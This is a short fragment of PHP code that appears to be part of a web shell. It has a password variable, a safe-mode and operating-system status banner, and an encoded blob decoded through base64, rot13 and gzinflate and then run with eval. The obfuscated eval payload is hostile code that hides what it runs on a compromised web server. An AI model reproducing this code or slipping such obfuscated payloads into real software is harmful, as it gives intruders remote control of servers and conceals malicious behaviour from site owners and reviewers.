...
$xos = "Safe-mode:[Safe-mode:".$hsafemode."] 12 [OS:".$os."]";
echo "<center> ".$xos." </center><br>";
$KcB="JcnBCoJAEIDhe9A7WRKtXjQPTikeOlWdV8y6UcimRhrqLLsjJdG7F2f8v7++gT3ND2RtitOz2HNMkh9/la838S4TF5hRIPYKtfRJ7mUOaU9C1EvCaABGoSp2gBkcbaVV859G6rrBgRN3Rkbn+b678IXzhgpyidoWDRWSfyeAikwFnofSDA+itpHcM3b32tDdKG+3oEk4IeCr5vAzHlpyz0iupDEQgXKFXw==";
eval(gzinflate(str_rot13(base64_decode($KcB))));
$auth_pass = "";
$color = "#df5";
